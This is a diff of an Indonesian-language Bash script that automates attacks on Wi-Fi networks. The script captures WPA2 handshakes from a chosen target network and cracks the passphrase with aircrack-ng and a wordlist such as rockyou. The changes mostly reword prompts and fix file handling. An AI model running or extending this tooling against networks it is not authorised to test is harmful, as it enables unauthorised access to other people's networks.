@@ -252,7 +252,7 @@ function capture_handshake(){
         while true; do
                 read -p "[#] Masukkan ESSID target yang ingin diserang: " essid_target
                 if [[ -z "${essid_target}" ]]; then
-                        echo "[-] ESSID tidak boleh kosong."
+                        echo "[-] ESSID tidak boleh kosong. Silahkan masukkan lagi."
                         continue
                 fi
                 echo "[+] ESSID -> ${essid_target}"
@@ -264,11 +264,11 @@ function capture_handshake(){
         while true; do
                 read -p "[#] Masukkan BSSID (Alamat MAC dari ESSID) yang ingin diserang: " bssid_target
                 if [[ -z "${bssid_target}" ]]; then
-                        echo "[-] BSSID tidak boleh kosong."
+                        echo "[-] BSSID tidak boleh kosong. Silahkan masukkan lagi."
                         continue
                 fi
                 if ! [[ "${bssid_target}" =~ ^([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$ ]]; then
-                        echo "[-] Format BSSID tidak valid harap masukkan dengan format (XX:XX:XX:XX:XX:XX)."
+                        echo "[-] Format BSSID tidak valid harap masukkan dengan format (XX:XX:XX:XX:XX:XX). silahkan masukkan lagi."
                         continue
                 fi
                 echo "[+] BSSID -> ${bssid_target}"
@@ -280,11 +280,11 @@ function capture_handshake(){
         while true; do
                 read -p "[#] Masukkan Channel dari BSSID yang ingin diserang: " channel_target
                 if [[ -z "${channel_target}" ]]; then
-                        echo "[-] Channel tidak boleh kosong."
+                        echo "[-] Channel tidak boleh kosong. Silahkan masukkan lagi."
                         continue
                 fi
                 if ! [[ "${channel_target}" =~ ^[0-9]+$ ]]; then
-                        echo "[-] Channel harus berupa angka."
+                        echo "[-] Channel harus berupa angka. Silahkan masukkan lagi."
                         continue
                 fi
                 echo "[+] Channel -> ${channel_target}"
@@ -295,11 +295,11 @@ function capture_handshake(){
         while true; do
                 read -p "[#] Berapa lama waktu Anda ingin mencapture handshake (detik): " lama_waktu
                 if [[ -z "${lama_waktu}" ]]; then
-                        echo "[-] Lama waktu tidak boleh kosong."
+                        echo "[-] Lama waktu tidak boleh kosong. Silahkan masukkan lagi."
                         continue
                 fi
                 if ! [[ "${lama_waktu}" =~ ^[0-9]+$ ]]; then
-                        echo "[-] Lama waktu harus berupa angka."
+                        echo "[-] Lama waktu harus berupa angka. Silahkan masukkan lagi."
                         continue
                 fi
                 echo "[+] Lama waktu capture handshake -> ${lama_waktu} detik"
@@ -310,7 +310,7 @@ function capture_handshake(){
         while true; do
                 read -p "[#] Masukkan nama file untuk menyimpan hasil capture handshake (tanpa ekstensi): " file_capture
                 if [[ -z "${file_capture}" ]]; then
-                        echo "[-] Nama file capture tidak boleh kosong."
+                        echo "[-] Nama file capture tidak boleh kosong. Silahkan masukkan lagi."
                         continue
                 fi
                 echo "[+] Nama file capture -> ${file_capture}-01.cap"
@@ -388,8 +388,8 @@ function save_hasil_crack(){
                                         echo "[+] Nama file untuk meyimpan hasil proses crack Wi-Fi -> ${fc}"
                                         echo "[*] Membuat file '${fc}'..."
                                         sleep 3
-                                        touch "${fc}"
                                         path_hc="${folder_hasil_crack}/${fc}"
+                                        touch "${path_hc}"
                                         if [[ $? -eq 0 ]]; then
                                                 echo "[+] File '${fc}' berhasil dibuat."
                                                 echo "[*] Menyimpan semua data hasil crack Wi-Fi kedalam file '${fc}'..."
@@ -433,6 +433,9 @@ EOF
                                 fi
                         done
                         break
+                elif [[ "${nanya_save}" == "n" || "${nanya_save}" == "N" ]]; then
+                        :
+                        break
                 else
                         echo "[-] Masukkan tidak valid. Harap masukkan 'Y/n'."
                         continue
@@ -464,12 +467,14 @@ function crack_passpharase(){
                         echo "[*] Mengcrack WPA2/PSK passphrase menggunakan file Wordlist '${rockyou}'..."
                         sleep 3
                         aircrack-ng -a2 "${path}-01.cap" -w "${rockyou}" -b "${bssid_target}" -e "${essid_target}" | tee "tmp.txt"
-                        if cat "tmp.txt" | grep -qi "found"; then
-                                password_wifi=$(grep -oP "KEY FOUND! \[ \K[^\]]*" "tmp.txt" | uniq)
-                        fi
                         echo "[*] Proses crack WPA2/PSK passphrase selesai."
-                        rm "tmp.txt"
-                        save_hasil_crack
+                        if [[ -f "tmp.txt" ]]; then
+                                if cat "tmp.txt" | grep -qi "found"; then
+                                        password_wifi=$(grep -oP "KEY FOUND! \[ \K[^\]]*" "tmp.txt" | uniq)
+                                fi
+                                rm "tmp.txt"
+                                save_hasil_crack
+                        fi
                         clean_up
                         break
                 elif [[ "${nanya_wordlist}" == "n" || "${nanya_wordlist}" == "N" ]]; then
@@ -486,12 +491,14 @@ function crack_passpharase(){
                                 echo "[*] Mengcrack WPA2/PSK passphrase menggunakan file Wordlist '${file_wordlist}'..."
                                 sleep 3
                                 aircrack-ng  -a2 "${path}-01.cap" -w "${file_wordlist}" -b "${bssid_target}" -e "${essid_target}"
-                                if cat "tmp.txt" | grep -qi "found"; then
-                                        password_wifi=$(grep -oP "KEY FOUND! \[ \K[^\]]*" "tmp.txt" | uniq)
-                                fi
                                 echo "[*] Proses crack WPA2/PSK passphrase selesai."
-                                rm "tmp.txt"
-                                save_hasil_crack
+                                if [[ -f "tmp.txt" ]]; then
+                                        if cat "tmp.txt" | grep -qi "found"; then
+                                                password_wifi=$(grep -oP "KEY FOUND! \[ \K[^\]]*" "tmp.txt" | uniq)
+                                        fi
+                                        rm "tmp.txt"
+                                        save_hasil_crack
+                                fi
                                 clean_up
                                 break
                         done
